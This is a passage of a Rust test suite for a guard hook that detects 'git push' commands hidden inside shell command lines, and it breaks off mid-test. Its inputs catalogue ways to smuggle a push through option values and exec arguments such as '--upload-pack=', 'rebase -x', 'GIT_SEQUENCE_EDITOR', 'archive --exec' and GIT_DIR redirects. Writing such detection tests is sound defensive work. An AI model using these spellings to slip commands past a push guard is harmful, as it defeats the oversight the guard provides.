            |text: &str| -> Vec<String> { text.split_whitespace().map(String::from).collect() };
        assert_eq!(inline_gh_host(&words("")), None);
        assert_eq!(inline_gh_host(&words("FOO=1")), None);
        assert_eq!(
            inline_gh_host(&words("GH_HOST=X.example")),
            Some(Ok(vec!["x.example".to_string()]))
        );
        assert_eq!(
            inline_gh_host(&words("env GH_HOST=x.example")),
            Some(Ok(vec!["x.example".to_string()]))
        );
        assert_eq!(inline_gh_host(&words("GH_HOST=$H")), Some(Err(())));
        assert_eq!(inline_gh_host(&words("GH_HOST=")), Some(Err(())));
        assert_eq!(inline_gh_host(&words("env -u GH_HOST")), Some(Err(())));
        assert_eq!(inline_gh_host(&words("GH_HOS$T=x")), Some(Err(())));
    }

    #[test]
    fn a_cd_flood_walks_in_linear_time() {
        // Each `cd a` used to copy the whole path built so far: quadratic in
        // a 200 KB flood (~0.27 s of a release guard's budget). The bound is
        // loose so a loaded test machine does not fail it; the release
        // timings are the measurement.
        let command = format!("{}git push origin main", "cd a; ".repeat(40_000));
        let started = std::time::Instant::now();
        let pushes = push_locations(&command, "/repo");
        assert!(
            started.elapsed() < std::time::Duration::from_secs(5),
            "took {:?}",
            started.elapsed()
        );
        assert_eq!(pushes.len(), 1);
        assert_eq!(pushes[0].work_dir.len(), "/repo".len() + 2 * 40_000);
    }

    fn only(command: &str, cwd: &str) -> PushInvocation {
        let mut found = push_invocations(command, cwd);
        assert_eq!(found.len(), 1, "expected exactly one push in {command:?}");
        found.remove(0)
    }

    /// cadence-hooks#1095: `repository_unresolved` is the which-repository half
    /// of `unresolved` — set where the push may not run in `work_dir`, and not
    /// by a cause that only changes what it publishes.
    #[test]
    fn push_locations_mark_only_an_unknowable_repository() {
        for (command, want_dir, repository_unresolved) in [
            ("eval 'cd /other'; git push origin main", "/repo", true),
            (
                "trap 'cd /other; git push origin main' EXIT",
                "/other",
                true,
            ),
            // An unreadable target is the directory half, not this one.
            ("cd \"$DIR\" && git push origin main", "/repo", false),
            ("cd - && git push origin main", "/repo", false),
            ("GIT_DIR=/x/.git git push origin main", "/repo", true),
            (
                "export GIT_DIR=/x/.git; git push origin main",
                "/repo",
                true,
            ),
            ("git --git-dir=/x/.git push origin main", "/repo", true),
            ("command -p git push origin main", "/repo", true),
            // Followed: a knowable directory, reported where the push runs.
            ("git -C /other push origin main", "/other", false),
            ("cd /other && git push origin main", "/other", false),
            ("pushd /other; git push origin main", "/other", false),
            ("builtin cd /other; git push origin main", "/other", false),
            ("cd sub && git push", "/repo/sub", false),
            // Which refs, not which repository.
            ("git -c push.default=matching push origin", "/repo", false),
            ("git push origin main", "/repo", false),
        ] {
            let found = push_locations(command, "/repo");
            assert_eq!(found.len(), 1, "{command}: {found:?}");
            assert_eq!(found[0].work_dir, want_dir, "{command}");
            assert_eq!(
                found[0].repository_unresolved, repository_unresolved,
                "{command}"
            );
        }
        // The ref-only cause still reaches `unresolved`.
        assert!(push_locations("git -c push.default=matching push origin", "/repo")[0].unresolved);
    }

    /// cameronsjo/cadence-hooks#1226: a push a git subcommand runs through its
    /// own exec argument is a push. Each row: the command, then per push found
    /// `(work_dir, repository_unresolved, unresolved, repository)`.
    #[test]
    fn pushes_nested_in_a_git_exec_argument_are_seen() {
        type Want = (&'static str, bool, bool, Option<&'static str>);
        let resolved = |dir| (dir, false, false, Some("origin"));
        let elsewhere = |dir| (dir, true, true, Some("origin"));
        let refused = |dir| (dir, true, true, None);
        let cases: Vec<(&str, Vec<Want>)> = vec![
            // rebase: every spelling git's option parser takes.
            (
                "git rebase -x 'git push origin main' HEAD~1",
                vec![resolved("/repo")],
            ),
            (
                "git rebase --exec 'git push origin main' HEAD~1",
                vec![resolved("/repo")],
            ),
            (
                "git rebase --exec='git push origin main' HEAD~1",
                vec![resolved("/repo")],
            ),
            (
                "git rebase --exe='git push origin main' HEAD~1",
                vec![resolved("/repo")],
            ),
            (
                "git rebase --ex 'git push origin main' HEAD~1",
                vec![resolved("/repo")],
            ),
            (
                "git rebase -ix'git push origin main' HEAD~1",
                vec![resolved("/repo")],
            ),
            (
                "git rebase -ix 'git push origin main' HEAD~1",
                vec![resolved("/repo")],
            ),
            (
                "git rebase HEAD~1 -x 'git push origin main'",
                vec![resolved("/repo")],
            ),
            (
                "git rebase -x 'make test' --exec 'git push origin main' HEAD~1",
                vec![resolved("/repo")],
            ),
            (
                "git rebase -x 'git push origin main' -x 'git push origin main' HEAD~1",
                vec![resolved("/repo"), resolved("/repo")],
            ),
            (
                "git rebase -x 'cd /other && git push origin main' HEAD~1",
                vec![resolved("/other")],
            ),
            (
                "git rebase -x 'sh -c \"git push origin main\"' HEAD~1",
                vec![resolved("/repo")],
            ),
            (
                "git -C /other rebase -x 'git push origin main' HEAD~1",
                vec![resolved("/other")],
            ),
            (
                "sudo git rebase -x 'git push origin main' HEAD~1",
                vec![resolved("/repo")],
            ),
            (
                "git-rebase -x 'git push origin main' HEAD~1",
                vec![resolved("/repo")],
            ),
            // A global the command exports to the nested push.
            (
                "git --git-dir=/x/.git rebase -x 'git push origin main' HEAD~1",
                vec![elsewhere("/repo")],
            ),
            (
                "git -c remote.origin.url=https://x/y rebase -x 'git push origin main' HEAD~1",
                vec![elsewhere("/repo")],
            ),
            // bisect run: the words, quoted as git hands them to its shell.
            (
                "git bisect run git push origin main",
                vec![resolved("/repo")],
            ),
            (
                "git bisect run sh -c 'git push origin main'",
                vec![resolved("/repo")],
            ),
            // Older gits joined the words unquoted; that reading is kept too.
            (
                "git bisect run 'git push origin main'",
                vec![resolved("/repo")],
            ),
            // submodule foreach and filter-branch run somewhere else.
            (
                "git submodule--helper foreach 'git push origin main'",
                vec![elsewhere("/repo")],
            ),
            (
                "git submodule foreach 'git push origin main'",
                vec![elsewhere("/repo")],
            ),
            (
                "git submodule --quiet foreach --recursive git push origin main",
                vec![elsewhere("/repo")],
            ),
            (
                "git filter-branch --env-filter 'git push origin main' HEAD",
                vec![elsewhere("/repo")],
            ),
            (
                "git filter-branch -f -d /tmp/t --msg-filter 'git push origin main' HEAD",
                vec![elsewhere("/repo")],
            ),
            (
                "git filter-branch --tree-filter true --commit-filter 'git push origin main' HEAD",
                vec![elsewhere("/repo")],
            ),
            (
                "git filter-branch --setup 'git push origin main' HEAD",
                vec![elsewhere("/repo")],
            ),
            // A command no reading can name: a push that cannot be resolved.
            ("git rebase -x \"$CMD\" HEAD~1", vec![refused("/repo")]),
            ("git rebase -x '$(cat cmd)' HEAD~1", vec![refused("/repo")]),
            ("git bisect run \"$RUNNER\"", vec![refused("/repo")]),
            ("git submodule foreach '`cat cmd`'", vec![refused("/repo")]),
            // Past the script cap: one refusal, nothing walked.
            (
                "git rebase -x a -x a -x a -x a -x a -x a -x a -x a -x a -x a -x a -x a -x a \
                 -x a -x a -x a -x a HEAD~1",
                vec![refused("/repo")],
            ),
            // Controls: nested commands that are not pushes.
            ("git rebase -x 'make test' HEAD~1", vec![]),
            ("git rebase -x 'git status' HEAD~1", vec![]),
            ("git rebase --onto main HEAD~1", vec![]),
            ("git rebase -- -x", vec![]),
            ("git bisect start HEAD HEAD~1", vec![]),
            ("git bisect run make test", vec![]),
            ("git submodule foreach 'git pull origin $branch'", vec![]),
            ("git submodule update --init", vec![]),
            (
                "git filter-branch --subdirectory-filter 'git push' HEAD",
                vec![],
            ),
            (
                "git filter-branch --index-filter 'git rm --cached x' HEAD",
                vec![],
            ),
            ("git log -x 'git push origin main'", vec![]),
            ("echo git rebase -x", vec![]),
        ];
        let tree = GitExecTree::new("git-exec-pushes");
        for (command, want) in cases {
            assert_eq!(tree.found(command, "/repo"), want, "{command}");
        }
    }

    /// `/repo` (holding `a/`, `a/x/` and `x/`) and `/other`, each a working
    /// tree with a `.git`, under one scratch root: the git-exec walk finds a
    /// rebase's working-tree top on the file system, so the rows need a real
    /// one. Paths in and out are written relative to the root.
    struct GitExecTree {
        scratch: Scratch,
    }

    impl GitExecTree {
        fn new(name: &str) -> Self {
            let scratch = Scratch::new(&scratch_root(), name);
            for dir in ["repo/.git", "repo/a/x/.git", "repo/x/.git", "other/.git"] {
                std::fs::create_dir_all(scratch.path().join(dir)).expect("create scratch tree");
            }
            Self { scratch }
        }

        fn root(&self) -> String {
            self.scratch.path().to_string_lossy().into_owned()
        }

        /// Per push found: `(work_dir, repository_unresolved, unresolved,
        /// repository)`, the work dir relative to the root.
        fn found(
            &self,
            command: &str,
            cwd: &str,
        ) -> Vec<(&'static str, bool, bool, Option<&'static str>)> {
            let root = self.root();
            let command = command.replace("/other", &format!("{root}/other"));
            push_locations(&command, &format!("{root}{cwd}"))
                .iter()
                .map(|push| {
                    let dir = push.work_dir.strip_prefix(&root).unwrap_or(&push.work_dir);
                    let dir: &'static str = Box::leak(dir.to_string().into_boxed_str());
                    let repository: Option<&'static str> = push
                        .repository
                        .clone()
                        .map(|repository| &*Box::leak(repository.into_boxed_str()));
                    (dir, push.repository_unresolved, push.unresolved, repository)
                })
                .collect()
        }
    }

    /// cameronsjo/cadence-hooks#1226 review, round 1: the shapes the first
    /// walk missed. B1 a `--` that is an option's value, B2 the helper's
    /// trailing flags, B3 a rebase/bisect/difftool command run at the top of
    /// the working tree, B6 difftool, transports and a rebase's editor. Each
    /// measured under git 2.43 with a canary.
    #[test]
    fn git_exec_pushes_the_review_found_are_seen() {
        type Want = (&'static str, bool, bool, Option<&'static str>);
        let resolved = |dir| (dir, false, false, Some("origin"));
        let elsewhere = |dir| (dir, true, true, Some("origin"));
        let refused = |dir| (dir, true, true, None);
        let lost = |dir| (dir, false, true, Some("origin"));
        let tree = GitExecTree::new("git-exec-review");
        let cases: Vec<(&str, &str, Vec<Want>)> = vec![
            // B1
            (
                "git rebase -X -- -x 'git push origin main' HEAD~1",
                "/repo",
                vec![resolved("/repo")],
            ),
            (
                "git rebase -s -- -x 'git push origin main' HEAD~1",
                "/repo",
                vec![resolved("/repo")],
            ),
            (
                "git rebase --onto -- -x 'git push origin main' HEAD~1",
                "/repo",
                vec![resolved("/repo")],
            ),
            (
                "git rebase -- -x 'git push origin main' HEAD~1",
                "/repo",
                vec![],
            ),
            // B2
            (
                "git submodule--helper foreach 'git push origin main' --quiet",
                "/repo",
                vec![elsewhere("/repo")],
            ),
            (
                "git submodule--helper foreach 'git push origin main' -q --recursive",
                "/repo",
                vec![elsewhere("/repo")],
            ),
            // B3: from `/repo/a`, git runs these in `/repo`.
            (
                "git rebase -x 'cd x && git push origin main' HEAD~1",
                "/repo/a",
                vec![resolved("/repo/x")],
            ),
            // The older-git joined reading also runs `git push` in `/repo`.
            (
                "git bisect run sh -c 'cd x && git push origin main'",
                "/repo/a",
                vec![resolved("/repo/x"), resolved("/repo")],
            ),
            (
                "git difftool -x 'cd x && git push origin main'",
                "/repo/a",
                vec![resolved("/repo/x")],
            ),
            (
                "git rebase -x 'git push origin main' HEAD~1",
                "/repo/a",
                vec![resolved("/repo")],
            ),
            (
                "git -C a rebase -x 'git push origin main' HEAD~1",
                "/repo",
                vec![resolved("/repo")],
            ),
            (
                "git -C /other rebase -x 'git push origin main' HEAD~1",
                "/repo/a",
                vec![resolved("/other")],
            ),
            // No working tree above the directory: kept, with a doubt.
            (
                "git rebase -x 'git push origin main' HEAD~1",
                "/nowhere",
                vec![lost("/nowhere")],
            ),
            // Submodule foreach runs in each submodule: unchanged.
            (
                "git submodule foreach 'git push origin main'",
                "/repo/a",
                vec![elsewhere("/repo/a")],
            ),
            // B5: a re-quoting chain is read through.
            (
                "git bisect run git bisect run git bisect run git bisect run git push origin main",
                "/repo",
                vec![resolved("/repo")],
            ),
            (
                "git bisect run git -C /other bisect run git push origin main",
                "/repo",
                vec![elsewhere("/repo")],
            ),
            // B6
            (
                "git difftool -x 'git push origin main'",
                "/repo",
                vec![resolved("/repo")],
            ),
            (
                "git difftool --extcmd='git push origin main'",
                "/repo",
                vec![resolved("/repo")],
            ),
            (
                "git fetch --upload-pack='git push origin main' .",
                "/repo",
                vec![elsewhere("/repo")],
            ),
            (
                "git ls-remote --upload-pack 'git push origin main' .",
                "/repo",
                vec![elsewhere("/repo")],
            ),
            (
                "git clone -u 'git push origin main' . /tmp/c",
                "/repo",
                vec![elsewhere("/repo")],
            ),
            (
                "git pull --upload-pack='git push origin main' . main",
                "/repo",
                vec![elsewhere("/repo")],
            ),
            (
                "git archive --remote=. --exec='git push origin main' HEAD",
                "/repo",
                vec![elsewhere("/repo")],
            ),
            (
                "GIT_SEQUENCE_EDITOR='git push origin main' git rebase -i HEAD~1",
                "/repo",
                vec![resolved("/repo")],
            ),
            (
                "GIT_EDITOR='git push origin main' git rebase -i HEAD~1",
                "/repo/a",
                vec![resolved("/repo")],
            ),
            (
                "git -c sequence.editor='git push origin main' rebase -i HEAD~1",
                "/repo",
                vec![elsewhere("/repo")],
            ),
            (
                "GIT_SEQUENCE_EDITOR=\"$ED\" git rebase -i HEAD~1",
                "/repo",
                vec![refused("/repo")],
            ),
            (
                "git --config-env=core.editor=ED rebase -i HEAD~1",
                "/repo",
                vec![refused("/repo")],
            ),
            // Controls
            (
                "GIT_SEQUENCE_EDITOR='git push origin main' git rebase HEAD~1",
                "/repo",
                vec![],
            ),
            ("git fetch -u origin", "/repo", vec![]),
            ("git difftool HEAD", "/repo", vec![]),
        ];
        for (command, cwd, want) in cases {
            assert_eq!(tree.found(command, cwd), want, "{command} (from {cwd})");
        }
    }

    /// cameronsjo/cadence-hooks#1226: the nesting is bounded. A git exec
    /// argument past [`MAX_WRAPPER_DEPTH`] is a refusal, never a miss, and a
    /// 200 KB flood of it stays linear.
    #[test]
    fn nested_git_exec_is_bounded_and_refused_past_the_bound() {
        let within = "git rebase -x \"git rebase -x 'git push origin main' HEAD~1\" HEAD~1";
        let found = push_locations(within, "/repo");
        assert_eq!(found.len(), 1, "{found:?}");
        assert!(!found[0].repository_unresolved, "{found:?}");

        // Nesting that quotes at each level (`rebase -x`) is bounded by the
        // depth: past it, one refusal.
        let deepest = r#"git rebase -x "git rebase -x \"git rebase -x 'git push origin main' HEAD~1\" HEAD~1" HEAD~1"#;
        let found = push_locations(deepest, "/repo");
        assert_eq!(found.len(), 1, "{found:?}");
        assert!(!found[0].repository_unresolved, "{found:?}");
        let past = deepest.replace("'git push", "'git bisect run git push");
        let found = push_locations(&past, "/repo");
        assert_eq!(found.len(), 1, "{found:?}");
        assert!(found[0].repository_unresolved, "{found:?}");
        assert_eq!(found[0].repository, None, "{found:?}");

        // `bisect run` re-quotes nothing, so its chain is read through at
        // any length rather than bounded.
        let chain = "git bisect run ".repeat(MAX_WRAPPER_DEPTH + 1) + "git push origin main";
        let found = push_locations(&chain, "/repo");
        assert_eq!(found.len(), 1, "{found:?}");
        assert!(!found[0].repository_unresolved, "{found:?}");

        for flood in [
            "git rebase -x \"".repeat(10_000) + "git push origin main",
            "git rebase -x a ".repeat(12_500),
            "git submodule foreach 'git rebase -x ".repeat(6_000),
            "git bisect run ".repeat(13_000) + "git push origin main",
            "git bisect run git -C . bisect run ".repeat(6_000) + "git push origin main",
            "git submodule--helper foreach git submodule--helper foreach -q ".repeat(3_000),
        ] {
            let started = std::time::Instant::now();
            let found = push_locations(&flood, "/repo");
            assert!(
                started.elapsed() < std::time::Duration::from_secs(5),
                "took {:?}",
                started.elapsed()
            );
            assert!(found.len() <= 16, "{}", found.len());
        }
    }

    #[test]
    fn bare_git_push_yields_an_implicit_head_refspec() {
        let invocation = only("git push", "/repo");
        assert_eq!(invocation.work_dir, "/repo");
        assert_eq!(invocation.refspecs.len(), 1);
        assert!(invocation.refspecs[0].implicit);
        assert_eq!(invocation.refspecs[0].source.as_deref(), Some("HEAD"));
        assert!(!invocation.unresolved);
    }

    #[test]
    fn sh_dash_c_wrapper_is_seen() {
        assert_eq!(sources("sh -c 'git push origin main'", "/repo"), ["main"]);
    }

    #[test]
    fn bash_lc_wrapper_is_seen() {
        assert_eq!(
            sources("bash -lc \"git push origin main\"", "/repo"),
            ["main"]
        );
    }

    #[test]
    fn env_and_command_prefixes_are_seen() {
        assert_eq!(sources("env FOO=1 git push origin main", "/repo"), ["main"]);
        assert_eq!(sources("command git push origin main", "/repo"), ["main"]);
    }

    #[test]
    fn push_behind_a_sudo_runner_with_flags_is_seen() {
        // The runner peel walks a modelled runner's OWN flags; refusing at the
        // first `-` would hide the push entirely.
        assert_eq!(
            sources("sudo -u me git push origin main", "/repo"),
            ["main"]
        );
    }

    #[test]
    fn quoted_git_push_in_an_echo_is_not_a_push() {
        // Tokenizing is what kills this: the quoted text is one argument word
        // and never sits in command position.
        assert!(push_invocations("echo \"git push origin main\"", "/repo").is_empty());
    }

    #[test]
    fn dash_capital_c_redirects_the_work_dir() {
        let invocation = only("git -C /elsewhere push origin main", "/repo");
        assert_eq!(invocation.work_dir, "/elsewhere");
        assert_eq!(invocation.refspecs[0].source.as_deref(), Some("main"));
    }

    #[test]
    fn dash_capital_c_accumulates_relative_hops() {
        let invocation = only("git -C sub -C deeper push", "/repo");
        assert_eq!(invocation.work_dir, "/repo/sub/deeper");
    }

    #[test]
    fn cd_moves_the_work_dir_for_a_later_push() {
        let invocation = only("cd /other && git push", "/repo");
        assert_eq!(invocation.work_dir, "/other");
    }

    /// A `cd` inside a `( … )` subshell ends with it (cameronsjo/cadence-hooks#1172),
    /// and a push that runs inside it still runs where the `cd` went. Rows are
    /// `(command, the directory of every push, in order)`.
    #[test]
    fn a_subshells_cd_does_not_move_the_parents_push() {
        for (command, want) in [
            (
                "(cd /other && git status); git push origin HEAD",
                &["/repo"][..],
            ),
            ("(cd /other; git status); git push origin HEAD", &["/repo"]),
            (
                "( cd /other ; git status ) ; git push origin HEAD",
                &["/repo"],
            ),
            ("(cd /other); git push origin HEAD", &["/repo"]),
            ("cd /x; (cd /other); git push origin HEAD", &["/x"]),
            (
                "((cd /other && git status)); git push origin HEAD",
                &["/repo"],
            ),
            (
                "(cd /a && (cd /b && git status); git status); git push origin HEAD",
                &["/repo"],
            ),
            ("echo $(true; cd /other); git push origin HEAD", &["/repo"]),
            // The dangerous twins: the push runs in the subshell's directory.
            ("(cd /other && git push origin HEAD)", &["/other"]),
            ("(cd /other; git push origin HEAD)", &["/other"]),
            (
                "(cd /a && (cd /b && git status); git push origin HEAD)",
                &["/a"],
            ),
            (
                "(cd /a; git push origin HEAD); git push origin HEAD",
                &["/a", "/repo"],
            ),
            (
                "(cd /other && git status); cd /other && git push origin HEAD",
                &["/other"],
            ),
            // Braces share the parent's directory.
            ("{ cd /other; }; git push origin HEAD", &["/other"]),
            (
                "{ cd /other && git status; } && git push origin HEAD",
                &["/other"],
            ),
            // A `case` arm's `)` cannot be told from a closer: the `cd` leaks.
            (
                "(cd /other; case x in a) true;; esac; git push origin HEAD)",
                &["/other"],
            ),
            (
                "(cd /other; case x in a) true;; esac); git push origin HEAD",
                &["/other"],
            ),
        ] {
            let dirs: Vec<String> = push_invocations(command, "/repo")
                .into_iter()
                .map(|push| push.work_dir)
                .collect();
            assert_eq!(dirs, want, "{command}");
        }
    }

    /// A flood of nested `(cd a;` is bounded, and stops scoping rather than
    /// restoring a directory it did not keep.
    #[test]
    fn a_nested_subshell_flood_is_bounded_and_keeps_the_leak() {
        let command = format!("{}git push origin main", "(cd a;".repeat(20_000));
        let started = std::time::Instant::now();
        let pushes = push_invocations(&command, "/repo");
        assert!(started.elapsed() < std::time::Duration::from_secs(5));
        assert_eq!(pushes.len(), 1);
        assert!(pushes[0].work_dir.starts_with("/repo/a/a"));
        let closed = format!("{}git push origin main", "(cd a;".repeat(40));
        let pushes = push_invocations(&format!("{closed}{}", ")".repeat(40)), "/repo");
        assert!(pushes[0].work_dir.starts_with("/repo/a/a"), "{pushes:?}");
    }

    #[test]
    fn command_substitution_cd_does_not_move_the_parent_work_dir() {
        // The flat-view miss this walk exists to reject: `$(cd /x)`'s `cd`
        // belongs to a subshell and must not re-point the parent's push.
        let invocation = only("echo $(cd /x) && git push", "/repo");
        assert_eq!(invocation.work_dir, "/repo");
    }

    #[test]
    fn backtick_substitution_push_is_reported_not_executed() {
        let found = push_invocations("echo `git push origin main`", "/repo");
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].refspecs[0].source.as_deref(), Some("main"));
    }

    #[test]
    fn multiple_refspecs_are_all_collected() {
        assert_eq!(
            sources("git push origin main topic release", "/repo"),
            ["main", "topic", "release"]
        );
    }

    #[test]
    fn local_colon_remote_refspec_takes_the_local_side() {
        let invocation = only("git push origin local:remote", "/repo");
        assert_eq!(invocation.refspecs[0].source.as_deref(), Some("local"));
        assert_eq!(
            invocation.refspecs[0].destination.as_deref(),
            Some("remote")
        );
    }

    #[test]
    fn push_origin_branch_b_resolves_branch_b_not_head() {
        assert_eq!(sources("git push origin branchB", "/repo"), ["branchB"]);
    }

    #[test]
    fn force_plus_prefix_is_stripped_from_the_source_ref() {
        assert_eq!(sources("git push origin +main:main", "/repo"), ["main"]);
    }

    #[test]
    fn delete_and_publish_in_one_command_keeps_the_publish() {
        let invocation = only("git push origin :dead newbranch", "/repo");
        assert_eq!(invocation.refspecs.len(), 2);
        assert!(invocation.refspecs[0].is_delete);
        assert_eq!(invocation.refspecs[0].source, None);
        assert!(!invocation.refspecs[1].is_delete);
        assert_eq!(invocation.refspecs[1].source.as_deref(), Some("newbranch"));
    }

    #[test]
    fn delete_flag_marks_every_refspec_a_delete() {
        let invocation = only("git push --delete origin topic", "/repo");
        assert!(invocation.refspecs[0].is_delete);
        assert_eq!(invocation.refspecs[0].source, None);

        let short = only("git push -d origin topic", "/repo");
        assert!(short.refspecs[0].is_delete);
    }

    #[test]
    fn all_flag_is_flagged() {
        assert!(only("git push --all origin", "/repo").all_or_mirror);
    }

    #[test]
    fn mirror_flag_is_flagged() {
        assert!(only("git push --mirror origin", "/repo").all_or_mirror);
    }

    #[test]
    fn dry_run_long_and_short_are_flagged() {
        assert!(only("git push --dry-run origin main", "/repo").dry_run);
        assert!(only("git push -n origin main", "/repo").dry_run);
        assert!(!only("git push origin main", "/repo").dry_run);
    }

    #[test]
    fn dry_run_is_not_inferred_from_a_dash_o_option_value() {
        // `-ono` is `-o` carrying the glued value `no`. Reading the `n` in that
        // value as `--dry-run` would allow a real push unscanned.
        assert!(!only("git push -ono origin main", "/repo").dry_run);
    }

    #[test]
    fn separate_value_option_value_is_not_a_refspec() {
        // `--receive-pack`'s value must be consumed, or `ZZZ` poses as the
        // repository and `origin` as a refspec.
        assert_eq!(
            sources("git push --receive-pack ZZZ origin main", "/repo"),
            ["main"]
        );
    }

    #[test]
    fn git_dir_redirect_marks_the_invocation_unresolved() {
        assert!(only("git --git-dir=/x/.git push origin main", "/repo").unresolved);
        assert!(only("git --work-tree /x push origin main", "/repo").unresolved);
        // A `-c` VALUE that looks like a redirect is not one.
        assert!(!only("git -c --git-dir=/x push origin main", "/repo").unresolved);
    }

    #[test]
    fn a_global_value_spelling_another_global_does_not_swallow_the_subcommand() {
        // `-C` here is `-c`'s value. A walk that decides "is this a value?" by
        // looking BACK one token then reads `push` as `-C`'s value, never
        // reaches the subcommand, and reports no push at all.
        let invocation = only("git -c -C push origin main", "/repo");
        assert_eq!(invocation.work_dir, "/repo");
        assert_eq!(invocation.refspecs[0].source.as_deref(), Some("main"));
    }

    #[test]
    fn a_trailing_valueless_global_reports_no_push() {
        // `git -C` is an error git never runs; the walk must not panic on it.
        assert!(push_invocations("git -C", "/repo").is_empty());
    }

    #[test]
    fn git_dir_env_prefix_marks_the_invocation_unresolved() {
        assert!(only("GIT_DIR=/x/.git git push origin main", "/repo").unresolved);
        assert!(only("GIT_WORK_TREE=/x git push origin main", "/repo").unresolved);
    }

    #[test]
    fn env_redirect_on_a_wrapper_segment_reaches_the_child_push() {
        // The prefix assignment is exported into the child shell, so the push
        // inside it really does run redirected. Computing the flag on the
        // wrapper segment and dropping it at the recursion boundary is the
        // #228/#378 miss reopened in a new module.
        assert!(only("GIT_WORK_TREE=/x sh -c 'git push origin main'", "/repo").unresolved);
        assert!(only("GIT_DIR=/x/.git sh -c 'git push origin main'", "/repo").unresolved);
    }

    #[test]
    fn an_exported_git_dir_in_an_earlier_segment_marks_a_later_push_unresolved() {
        assert!(only("export GIT_DIR=/x/.git && git push origin main", "/repo").unresolved);
        assert!(only("export GIT_WORK_TREE=/x; git push origin main", "/repo").unresolved);
    }

    #[test]
    fn a_bare_git_dir_assignment_segment_marks_a_later_push_unresolved() {
        // An assignment with no command word persists in the shell, unlike a
        // command prefix, which applies to that one command only.
        assert!(only("GIT_DIR=/x/.git; git push origin main", "/repo").unresolved);
    }

    #[test]
    fn an_assignment_used_as_a_command_prefix_does_not_leak_to_a_later_push() {
        // `GIT_DIR=/x git status` sets the variable for `git status` alone, so
        // the push after it is NOT redirected and must stay resolvable.
        let found = push_invocations("GIT_DIR=/x/.git git status; git push origin main", "/repo");
        assert_eq!(found.len(), 1);
        assert!(!found[0].unresolved);
    }

    #[test]
    fn a_command_line_config_override_marks_an_implicit_refspec_unresolved() {
        // The walk's own `git config` subprocess reads the REPOSITORY, so a
        // setting the command supplies is structurally invisible to it.
        assert!(only("git -c push.default=matching push origin", "/repo").unresolved);
        assert!(only("git --config-env=push.default=V push origin", "/repo").unresolved);
        assert!(only("git --config-env push.default=V push origin", "/repo").unresolved);
        assert!(
            only(
                "git -c remote.origin.push=refs/heads/*:refs/heads/* push origin",
                "/repo"
            )
            .unresolved
        );
    }

    #[test]
    fn an_unrelated_command_line_config_leaves_an_implicit_refspec_resolved() {
        assert!(!only("git -c color.ui=never push origin", "/repo").unresolved);
        // `remote.<name>.pushurl` changes the destination, not the ref set.
        assert!(!only("git -c remote.origin.pushurl=/x push origin", "/repo").unresolved);
    }

    #[test]
    fn a_command_line_url_override_is_reported_by_where_it_sends_the_push() {
        // cadence-hooks#1131: git sends the push to a `-c` URL, which the
        // repository probe cannot see.
        for (command, destinations, unreadable) in [
            (
                "git -c remote.origin.pushurl=https://e.example/x push origin main",
                vec!["https://e.example/x"],
                false,
            ),
            (
                "git -c Remote.origin.URL=/srv/x.git push origin main",
                vec!["/srv/x.git"],
                false,
            ),
            (
                "git -c remote.a.url=u1 -c remote.a.pushurl=u2 push a main",
                vec!["u1", "u2"],
                false,
            ),
            (
                "git -c url.https://e.example/.insteadOf=https://github.com/ push origin main",
                vec![],
                true,
            ),
            (
                "git -c url.https://e.example/.PushInsteadOf=x push origin main",
                vec![],
                true,
            ),
            ("git -c include.path=/x push origin main", vec![], true),
            (
                "git -c includeIf.gitdir:/x.path=/y push origin main",
                vec![],
                true,
            ),
            (
                "git --config-env=remote.origin.url=V push origin main",
                vec![],
                true,
            ),
            (
                "git --config-env remote.origin.pushurl=V push origin main",
                vec![],
                true,
            ),
            (
                "git -c remote.origin.pushurl=$U push origin main",
                vec![],
                true,
            ),
            (
                "git -c remote.origin.pushurl push origin main",
                vec![],
                true,
            ),
            // Controls: keys that do not decide the destination.
            ("git -c color.ui=false push origin main", vec![], false),
            (
                "git -c remote.origin.push=refs/x push origin main",
                vec![],
                false,
            ),
            (
                "git -c remote.origin.urlx=y push origin main",
                vec![],
                false,
            ),
            // An empty subsection still names the variable: judged, not skipped.
            ("git -c url..insteadof=y push origin main", vec![], true),
            ("git push origin main", vec![], false),
        ] {
            let push = only(command, "/repo");
            assert_eq!(push.config_destinations, destinations, "{command}");
            assert_eq!(push.destination_unreadable, unreadable, "{command}");
        }
    }

    #[test]
    fn a_command_line_config_override_does_not_mark_an_explicit_refspec() {
        // A named refspec replaces the `push.default` computation outright, so
        // the override cannot change what is published.
        assert!(!only("git -c push.default=matching push origin main", "/repo").unresolved);
    }

    #[test]
    fn a_git_config_env_prefix_marks_the_invocation_unresolved() {
        assert!(
            only(
                "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=push.default GIT_CONFIG_VALUE_0=matching git push",
                "/repo"
            )
            .unresolved
        );
        assert!(only("GIT_CONFIG_GLOBAL=/x git push origin main", "/repo").unresolved);
        assert!(only("GIT_CONFIG_SYSTEM=/x git push origin main", "/repo").unresolved);
        assert!(only("export GIT_CONFIG_COUNT=1 && git push origin main", "/repo").unresolved);
    }

    #[test]
    fn an_unresolvable_cd_target_marks_every_later_push_unresolved() {
        // The pre-`cd` directory is not "nothing" — it is the session's own
        // checkout, which answers rev-list confidently for a push that ran
        // somewhere else.
        for command in [
            "cd \"$BUILD\" && git push origin main",
            "cd \"$HOME/other\" && git push origin main",
            "cd \"$(git rev-parse --show-toplevel)/sub\" && git push origin main",
            "cd \"$(git -C /other rev-parse --show-toplevel)\" && git push origin main",
            "cd -; git push origin main",
            "cd; git push origin main",
        ] {
            let invocation = only(command, "/repo");
            assert!(invocation.unresolved, "should be unresolved: {command}");
            // The directory half only: nothing here names another repository.
            assert!(invocation.directory_unverified, "{command}");
            assert!(!invocation.repository_unresolved, "{command}");
        }
    }

    #[test]
    fn a_cd_to_the_current_toplevel_stays_in_the_repository() {
        // cadence-hooks#1095 ruling: `$(git rev-parse --show-toplevel)` names
        // the repository the walk is already in, after any hop it followed.
        for (command, want_dir) in [
            (
                "cd \"$(git rev-parse --show-toplevel)\" && git push origin main",
                "/repo",
            ),
            (
                "cd $(git rev-parse --show-toplevel) && git push -u origin feat",
                "/repo",
            ),
            (
                "cd `git rev-parse --show-toplevel` && git push origin main",
                "/repo",
            ),
            (
                "cd /other && cd \"$(git rev-parse --show-toplevel)\" && git push",
                "/other",
            ),
            (
                "git -C \"$(git rev-parse --show-toplevel)\" push origin main",
                "/repo",
            ),
            (
                "git -C /other -C \"$(git rev-parse --show-toplevel)\" push",
                "/other",
            ),
        ] {
            let invocation = only(command, "/repo");
            assert_eq!(invocation.work_dir, want_dir, "{command}");
            assert!(!invocation.directory_unverified, "{command}");
